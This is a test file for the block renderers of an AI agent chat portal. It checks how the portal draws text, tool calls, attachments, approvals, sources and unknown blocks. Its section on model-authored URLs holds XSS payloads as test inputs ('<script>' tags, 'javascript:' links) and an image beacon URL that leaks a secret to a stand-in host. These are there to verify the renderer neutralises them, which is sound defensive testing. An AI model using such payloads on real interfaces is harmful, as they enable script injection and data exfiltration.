/**
 * The nine block renderers, one test each, plus the fallthrough (Phase 6).
 *
 * `chat-logic.test.ts` owns the rules; this owns the drawing. The two that are
 * not merely coverage:
 *
 * **`unknown` renders, always, and is expanded.** It is driven here with a
 * block kind the renderer has never seen, which is the case the contract is
 * actually about — a `hermes_ref` bump can add block kinds, and a version bump
 * must never blank a transcript.
 *
 * **A `hermetic` block carries a ref and never data.** The agent card is
 * rendered with no fleet provider at all, so anything it drew would have had to
 * come off the block. It draws the ref and says it has no row, which is the
 * behaviour that keeps the card right three hours later.
 */
import { cleanup, fireEvent, render, screen, userEvent, within } from "./dom.ts";
import { afterEach, describe, expect, test } from "bun:test";
import type { ChatBlockView } from "../src/api/index.ts";
import { Block } from "../src/chat/components/blocks/index.tsx";
import { FailureCard, splitError } from "../src/chat/components/Message.tsx";

afterEach(cleanup);

const NOW = new Date("2026-09-16T12:00:00Z").getTime();

/** The fixture data is landing in parallel, so these are hand-built doubles. */
function block(value: Record<string, unknown>): ChatBlockView {
  return value as unknown as ChatBlockView;
}

function draw(value: Record<string, unknown>, streaming = false) {
  return render(<Block block={block(value)} now={NOW} streaming={streaming} />);
}

describe("text", () => {
  test("markdown becomes elements, never innerHTML", () => {
    const { container } = draw({
      kind: "text",
      markdown: "# Found\n\nTwo boxes are **behind**.\n\n- ember\n- fathom",
    });
    expect(container.querySelector("h1")?.textContent).toBe("Found");
    expect(container.querySelector("strong")?.textContent).toBe("behind");
    expect(container.querySelectorAll("li")).toHaveLength(2);
  });

  test("live and persisted marker identifiers keep every underscore", () => {
    const marker = "LIVE_CHAT_1789679968888_AFTER_ABORT";
    const value = block({ kind: "text", markdown: `${marker} _verified_` });
    const { container, rerender } = render(<Block block={value} now={NOW} streaming />);
    expect(container.textContent).toContain(`${marker} verified`);
    expect(container.querySelector("em")?.textContent).toBe("verified");
    rerender(<Block block={value} now={NOW} streaming={false} />);
    expect(container.textContent).toContain(`${marker} verified`);
    expect(container.querySelectorAll("em")).toHaveLength(1);
  });

  test("a fenced block becomes a card with a code pane in it", () => {
    const { container } = draw({ kind: "text", markdown: "```bash\ndf -h /data\n```" });
    expect(container.querySelector("pre.ch-code")?.textContent).toBe("df -h /data");
  });

  test("HTML a model wrote is shown as characters, not parsed", () => {
    const { container } = draw({ kind: "text", markdown: "<script>alert(1)</script>" });
    expect(container.querySelector("script")).toBeNull();
    expect(container.textContent).toContain("<script>");
  });

  test("a turn still arriving carries the caret", () => {
    const { container } = draw({ kind: "text", markdown: "still typing" }, true);
    expect(container.querySelector(".caret")).not.toBeNull();
  });
});

describe("reasoning", () => {
  test("opens shut, with what it cost on the head, and opens on a click", async () => {
    const { container } = draw({
      kind: "reasoning",
      text: "The heartbeat already carries disk, so one call beats thirteen.",
      duration_ms: 11800,
      tokens: 2140,
    });
    const card = container.querySelector(".ch-card");
    expect(card?.className).toContain("muted");
    expect(card?.className).toContain("collapsed");
    expect(screen.getByText(/thought for 11\.8s · 2,140 tokens/)).toBeDefined();
    expect(screen.queryByText(/beats thirteen/)).toBeNull();

    await userEvent.click(screen.getByRole("button", { name: /Reasoning/ }));
    expect(screen.getByText(/beats thirteen/)).toBeDefined();
  });
});

describe("tool", () => {
  test("a green exit code starts collapsed, and its output is not even laid out", () => {
    const { container } = draw({
      kind: "tool",
      name: "terminal",
      args: { command: "df -h /data" },
      result: "Use% 91%",
      status: "ok",
      exit_code: 0,
      duration_ms: 200,
    });
    expect(container.querySelector(".ch-card")?.className).toContain("collapsed");
    expect(screen.getByText("exit 0 · 200ms")).toBeDefined();
    expect(screen.queryByText(/Use% 91%/)).toBeNull();
  });

  test("a failed call starts expanded — that one is the whole message", () => {
    draw({
      kind: "tool",
      name: "terminal",
      args: { command: "ncdu -x /data" },
      result: "/bin/sh: 1: ncdu: not found",
      status: "bad",
      exit_code: 127,
    });
    expect(screen.getByText(/ncdu: not found/)).toBeDefined();
  });

  test("the `diff` hint classes added and removed lines", async () => {
    const { container } = draw({
      kind: "tool",
      name: "edit_file",
      args: { path: "/data/crawl.py" },
      result: "@@ -1,2 +1,2 @@\n-old line\n+new line",
      status: "warn",
      render: "diff",
    });
    // `warn` is a settled verdict, so the card opens shut by the collapse rule.
    await userEvent.click(screen.getByRole("button", { name: /edit_file/ }));
    expect(container.querySelector(".ch-diff .hunk")).not.toBeNull();
    expect(container.querySelector(".ch-diff .add")?.textContent).toBe("+new line");
    expect(container.querySelector(".ch-diff .del")?.textContent).toBe("-old line");
  });

  test("the `table` hint builds a table from an array of objects", async () => {
    const { container } = draw({
      kind: "tool",
      name: "metrics",
      args: {},
      result: [{ agent: "ember", used: "91%" }],
      status: "ok",
      render: "table",
    });
    await userEvent.click(screen.getByRole("button", { name: /metrics/ }));
    const table = container.querySelector("table.ch-table");
    expect(table).not.toBeNull();
    expect(within(table as HTMLElement).getByText("ember")).toBeDefined();
  });

  test("a screenshot with no bytes says so instead of drawing a broken image", async () => {
    const { container } = draw({
      kind: "tool",
      name: "browser",
      args: { url: "console.aws.amazon.com" },
      result: {},
      status: "ok",
      render: "screenshot",
    });
    await userEvent.click(screen.getByRole("button", { name: /browser/ }));
    expect(container.querySelector(".ch-shot-fake")).not.toBeNull();
  });

  test("a running tool is not collapsible and is drawn as in flight", () => {
    const { container } = draw({
      kind: "tool",
      name: "terminal",
      args: { command: "du -xh /data" },
      result: null,
      status: "running",
      duration_ms: 42000,
    });
    expect(container.querySelector(".ch-card")?.className).toContain("acc");
    expect(container.querySelector(".ch-card")?.className).not.toContain("collapsed");
    expect(screen.getByText(/running · 42\.0s/)).toBeDefined();
  });

  test("an MCP tool wears its server badge", () => {
    draw({
      kind: "tool",
      name: "create_issue",
      server: "linear",
      args: {},
      result: "INFRA-284",
      status: "ok",
    });
    expect(screen.getByText("mcp · linear")).toBeDefined();
  });

  test("a `render` hint this build cannot name falls back to the payload", () => {
    // Same rule as the block-kind switch: the hint is a hint, and an unknown
    // one renders the payload rather than nothing.
    draw({
      kind: "tool",
      name: "hologram",
      args: {},
      result: "projected",
      status: "bad",
      render: "hologram",
    });
    expect(screen.getByText("projected")).toBeDefined();
  });
});

describe("attachment", () => {
  test("a file is named, sized and downloadable", () => {
    draw({
      kind: "attachment",
      name: "disk-projection.svg",
      mime: "image/svg+xml",
      bytes: 18 * 1024,
      href: "/blob/1",
    });
    expect(screen.getByText("disk-projection.svg")).toBeDefined();
    expect(screen.getByText(/18 KB/)).toBeDefined();
  });

  test("an image is shown as well as named", () => {
    const { container } = draw({
      kind: "attachment",
      name: "grafana.png",
      mime: "image/png",
      bytes: 214 * 1024,
      href: "/blob/2",
    });
    expect(container.querySelector("img")?.getAttribute("src")).toBe("/blob/2");
  });
});

describe("approval", () => {
  test("never softened, never collapsed, and honest about what it cannot do yet", () => {
    const { container } = draw({
      kind: "approval",
      tool: "write_file",
      summary: "/data/reports/disk.md · 2.1 KB · new file",
      detail: null,
      expires_at: "2026-09-16T12:04:00Z",
    });
    // It is `.ch-approve` and not a `.ch-card`: it does not obey the collapse
    // rule because it has no verdict — nothing has happened, which is the point.
    expect(container.querySelector(".ch-approve")).not.toBeNull();
    expect(container.querySelector(".collapsed")).toBeNull();
    expect(screen.getByText("write_file")).toBeDefined();
    expect(screen.getByText(/expires/)).toBeDefined();
  });
});

describe("question", () => {
  test("choices, not free text", () => {
    const { container } = draw({
      kind: "question",
      prompt: "Which cutoff should I use?",
      choices: ["30 days", "7 days", "neither"],
    });
    expect(screen.getByText("Which cutoff should I use?")).toBeDefined();
    const choices = container.querySelectorAll("button.ch-prompt");
    expect(choices).toHaveLength(3);
    expect(container.querySelector("input,textarea")).toBeNull();
    // Inert until Phase 10 rather than enabled and silently doing nothing.
    expect((choices[0] as HTMLButtonElement).disabled).toBe(true);
  });
});

describe("sources", () => {
  test("a collapsed card whose rows are the anchors the citations point at", async () => {
    const { container } = draw({
      kind: "sources",
      items: [
        { title: "EBS volume types", href: "https://docs.aws.amazon.com/a", snippet: null },
        { title: "Provisioned throughput", href: "https://docs.aws.amazon.com/b", snippet: null },
      ],
    });
    expect(container.querySelector(".ch-card")?.className).toContain("collapsed");
    await userEvent.click(screen.getByRole("button", { name: /Sources/ }));
    expect(container.querySelector("#source-1")).not.toBeNull();
    expect(container.querySelector("#source-2")).not.toBeNull();
    expect(screen.getByText("EBS volume types")).toBeDefined();
  });
});

describe("hermetic", () => {
  test("an agent card with no live fleet draws the ref and nothing else", () => {
    // The card carries a ref and never data. With no fleet in the tree there is
    // nothing to read, and anything on screen beyond the name would have had to
    // come off the block — which is the failure this test exists to catch.
    draw({ kind: "hermetic", card: "agent", ref: "ember" });
    expect(screen.getByText("ember")).toBeDefined();
    expect(screen.getByText("not in this fleet")).toBeDefined();
  });

  test("a plan card states that chat cannot apply one", () => {
    draw({ kind: "hermetic", card: "plan", ref: "quill" });
    expect(screen.getByText(/cannot apply one/)).toBeDefined();
  });

  test("an op card points at the registry rather than redrawing it", () => {
    draw({ kind: "hermetic", card: "op", ref: "7f3c" });
    expect(screen.getByText(/op registry/)).toBeDefined();
  });

  test("a fleet card reads the live config, not the block", () => {
    draw({ kind: "hermetic", card: "fleet", ref: "fxtr0001" });
    // Twice: the head names the ref, and the body falls back to it because no
    // live config answered.
    expect(screen.getAllByText("fxtr0001")).toHaveLength(2);
    expect(screen.getByText("no live fleet here")).toBeDefined();
  });
});

/*
 * A send's status frame, which is an `activity` block like any other.
 *
 * The head mints no labels for it. Core decides what the five states of
 * `ChatStatusState` say — `SUBMIT_TITLES` in `hermes-chat-turn.ts`, and
 * `hermesActivity` for the two the shared vocabulary already names — and this
 * renderer draws `title` verbatim. That is deliberate: the busy-mode states
 * come back from the gateway, a newer gateway can name one this build has
 * never heard of, and a head that switched on the state would have to blank
 * the row it could not label.
 */
describe("the status snapshot a send mints", () => {
  const status = (title: string, state = "running", category = "queue") => ({
    kind: "activity",
    category,
    key: "queue",
    title,
    state,
    detail: null,
    payload: { state: "queued", warm_slots: 3 },
  });

  test("core's own words for each state reach the transcript unchanged", () => {
    for (const title of [
      "Connecting to Hermes",
      "Agent is working",
      "Waiting for the agent",
      "Redirecting the running turn",
      "Steering the running turn",
    ]) {
      const { container, unmount } = draw(status(title));
      expect(container.textContent).toContain(title);
      unmount();
    }
  });

  test("a state this build has never heard of renders its title rather than nothing", () => {
    // What a newer gateway's busy-mode looks like from here: an unknown
    // category and an unknown run state, carrying a title that is still true.
    const { container } = draw(status("Rewinding the running turn", "spooling", "chronomancy"));
    expect(container.textContent).toContain("Rewinding the running turn");
  });
});

describe("unknown — the fallthrough, and the contract", () => {
  test("an `unknown` block retains inspectable arguments and result, initially collapsed", () => {
    const { container } = draw({
      kind: "unknown",
      name: "bitwarden_secret_get",
      payload: { args: { project: "main-fleet" }, result: { ok: true, value: "[redacted]" } },
    });
    expect(container.querySelector(".collapsed")).toBeNull();
    expect(screen.getByText("bitwarden_secret_get")).toBeDefined();
    expect(screen.getByText("Arguments")).toBeDefined();
    expect(screen.getByText("Result")).toBeDefined();
    expect(screen.getByText(/main-fleet/)).toBeDefined();
    expect(screen.getByText(/redacted/)).toBeDefined();
  });

  test("a block KIND the renderer has never seen still renders, initially collapsed", () => {
    // This is the case the contract is about: a `hermes_ref` bump can add a
    // block kind as easily as a tool, and a version bump must never blank a
    // transcript. Nothing about this shape is known to this build.
    const { container } = draw({ kind: "hologram", shimmer: 0.4, colour: "amber" });
    expect(container.querySelector<HTMLDetailsElement>(".ch-event")?.open).toBe(false);
    expect(container.querySelector(".collapsed")).toBeNull();
    expect(screen.getByText("hologram")).toBeDefined();
    expect(screen.getByText(/amber/)).toBeDefined();
  });

  test("a block with no kind at all still renders", () => {
    const { container } = draw({ note: "the adapter sent something shapeless" });
    expect(container.querySelector<HTMLDetailsElement>(".ch-event")?.open).toBe(false);
    expect(screen.getByText(/shapeless/)).toBeDefined();
  });
});

/* ── message-level failure, which is one renderer and not six blocks ─────── */

describe("the failure card", () => {
  test("a code with a sentence after it keeps both halves", () => {
    // The shape the fixture writes, and a plausible shape from a box: the code
    // decides the copy, the sentence becomes the detail.
    expect(splitError("MODEL_NOT_GRANTED · not in the Bedrock grant")).toEqual({
      code: "MODEL_NOT_GRANTED",
      message: "not in the Bedrock grant",
    });
    expect(splitError("CHAT_NO_SLOT")).toEqual({ code: "CHAT_NO_SLOT", message: null });
    expect(splitError("the gateway simply gave up")).toEqual({
      code: null,
      message: "the gateway simply gave up",
    });
    // A turn that stopped with nothing said about why.
    expect(splitError(null)).toEqual({ code: "INCOMPLETE", message: null });
  });

  test("each of the six turn failures is the same card with different words", () => {
    for (const [code, expected] of [
      ["PROVIDER_RATE_LIMITED", "Rate limited."],
      ["PROVIDER_UNAUTHORIZED", "The profile's key was rejected."],
      ["MAX_TURNS", "Hit the turn ceiling mid-task."],
      ["CONTEXT_FULL", "This thread has filled the model's window."],
      ["CHAT_UNREACHABLE", "The box stopped answering."],
      ["MODEL_NOT_GRANTED", "The fleet's role may not invoke this model."],
    ] as const) {
      cleanup();
      const { container } = render(<FailureCard code={code} message={null} />);
      expect(container.querySelectorAll(".ch-card")).toHaveLength(1);
      expect(screen.getByText(expected)).toBeDefined();
      expect(screen.getByText(code)).toBeDefined();
    }
  });

  test("a code nobody has written copy for still gets a card with the code on it", () => {
    render(<FailureCard code="HOLOGRAM_REFUSED" message="the box said no" />);
    expect(screen.getByText("HOLOGRAM_REFUSED")).toBeDefined();
    expect(screen.getByText(/the box said no/)).toBeDefined();
  });
});

/* ── URLs a model wrote, at the three places they reach the DOM ──────────── */

describe("model-authored URLs", () => {
  test("a `javascript:` link in prose is drawn as characters, not as an anchor", () => {
    // The portal talks to a loopback API with no token beyond same-origin and
    // no CSP, so one click on a link a model wrote is the whole fleet surface.
    const { container } = draw({
      kind: "text",
      markdown: "[click me](javascript:fetch('/api/settings'))",
    });
    expect(container.querySelector("a")).toBeNull();
    expect(container.textContent).toContain("click me");
    expect(container.textContent).toContain("javascript:");
  });

  test("an ordinary link is still a link", () => {
    const { container } = draw({
      kind: "text",
      markdown: "[the docs](https://docs.aws.amazon.com/ebs)",
    });
    expect(container.querySelector("a")?.getAttribute("href")).toBe("https://docs.aws.amazon.com/ebs");
  });

  test("a source with an unusable href is listed but not linked", async () => {
    const { container } = draw({
      kind: "sources",
      items: [{ title: "not a source", href: "javascript:alert(1)", snippet: null }],
    });
    await userEvent.click(screen.getByRole("button", { name: /Sources/ }));
    expect(container.querySelector("a.ch-src")).toBeNull();
    expect(container.querySelector("span.ch-src")).not.toBeNull();
    expect(screen.getByText("not a source")).toBeDefined();
  });

  test("an off-origin image is named rather than fetched", () => {
    // An `<img>` is requested on render with no click at all, so a box that
    // wants to signal out only has to name an off-tailnet URL and let this
    // browser deliver the request for it.
    const { container } = draw({
      kind: "attachment",
      name: "beacon.png",
      mime: "image/png",
      bytes: 10,
      href: "https://beacon.example/p.png?leak=secret",
    });
    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("beacon.png")).toBeDefined();
  });

  test("a same-origin attachment is shown and downloadable", () => {
    const { container } = draw({
      kind: "attachment",
      name: "queue-depth.png",
      mime: "image/png",
      bytes: 421_776,
      href: "/api/chat/attachments/fixture/queue-depth.png",
    });
    expect(container.querySelector("img")?.getAttribute("src")).toBe(
      "/api/chat/attachments/fixture/queue-depth.png",
    );
    expect(container.querySelector("a.ch-attach-item")).not.toBeNull();
  });

  test("an off-origin tool screenshot is refused and says why", async () => {
    const { container } = draw({
      kind: "tool",
      name: "browser",
      args: {},
      result: { href: "https://beacon.example/shot.png" },
      status: "ok",
      render: "screenshot",
    });
    await userEvent.click(screen.getByRole("button", { name: /browser/ }));
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector(".ch-shot-fake")?.textContent).toContain(
      "not served by this portal",
    );
  });

  test("an attachment preview that fails to load collapses to one line, chip kept", () => {
    // The fixture's `queue-depth.png` names a path nothing serves: the broken
    // `<img>` drew a transcript-wide box around its alt text, screens tall.
    const { container } = draw({
      kind: "attachment",
      name: "queue-depth.png",
      mime: "image/png",
      bytes: 421_776,
      href: "/api/chat/attachments/fixture/queue-depth.png",
    });
    const img = container.querySelector("img");
    expect(img).not.toBeNull();
    fireEvent.error(img as HTMLImageElement);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector(".ch-shot-missing")?.textContent).toBe("preview unavailable");
    expect(container.querySelector("a.ch-attach-item")).not.toBeNull();
  });

  test("a same-origin tool screenshot that fails to load falls back to the placeholder", async () => {
    const { container } = draw({
      kind: "tool",
      name: "browser",
      args: {},
      result: { href: "/api/chat/attachments/fixture/granite-grafana.png" },
      status: "ok",
      render: "screenshot",
    });
    await userEvent.click(screen.getByRole("button", { name: /browser/ }));
    fireEvent.error(container.querySelector("img") as HTMLImageElement);
    expect(container.querySelector("img")).toBeNull();
    expect(container.querySelector(".ch-shot-fake")?.textContent).toContain("could not be loaded");
  });
});

/* ── the collapse rule applies to a card that changes verdict ────────────── */

test("a tool that settles green collapses, not only one read back out of history", () => {
  // The rule is a function of the *current* verdict. Computing it once at mount
  // left every streamed tool call sitting open with its output on screen the
  // moment it succeeded — "a green exit code was never news" held on the
  // history path only.
  const running = {
    kind: "tool",
    name: "terminal",
    args: { command: "du -xh /data" },
    result: null,
    status: "running",
  };
  const { container, rerender } = render(<Block block={block(running)} now={NOW} />);
  expect(container.querySelector(".ch-card")?.className).not.toContain("collapsed");

  rerender(
    <Block
      block={block({ ...running, status: "ok", exit_code: 0, result: "38G /data/hermes" })}
      now={NOW}
    />,
  );
  expect(container.querySelector(".ch-card")?.className).toContain("collapsed");
  expect(screen.queryByText(/38G/)).toBeNull();
});

test("an operator who opened a card keeps it open when the verdict settles", () => {
  const running = { kind: "tool", name: "terminal", args: {}, result: null, status: "running" };
  const { container, rerender } = render(<Block block={block(running)} now={NOW} />);
  rerender(<Block block={block({ ...running, status: "ok", result: "quiet" })} now={NOW} />);
  expect(container.querySelector(".ch-card")?.className).toContain("collapsed");
  // Having clicked is more specific than the rule, so it wins from then on.
  fireEvent.click(screen.getByRole("button", { name: /terminal/ }));
  expect(container.querySelector(".ch-card")?.className).not.toContain("collapsed");
  rerender(<Block block={block({ ...running, status: "warn", result: "quiet" })} now={NOW} />);
  expect(container.querySelector(".ch-card")?.className).not.toContain("collapsed");
});

/* ── a `hermetic` card this build cannot name ────────────────────────────── */

test("an unrecognised hermetic card is drawn as unknown, never as a plan", () => {
  // A fifth card value drawn under the heading `plan · needs confirming` would
  // be the UI asserting something about the fleet that nobody told it. A wrong
  // label is worse than an unstyled payload.
  const { container } = draw({ kind: "hermetic", card: "budget", ref: "fxtr0001" });
  expect(container.textContent).not.toContain("needs confirming");
  expect(container.textContent).not.toContain("cannot apply one");
  expect(screen.getByText("Additional activity")).toBeDefined();
  expect(container.querySelector<HTMLDetailsElement>(".ch-event")?.open).toBe(false);
  expect(container.querySelector(".collapsed")).toBeNull();
});
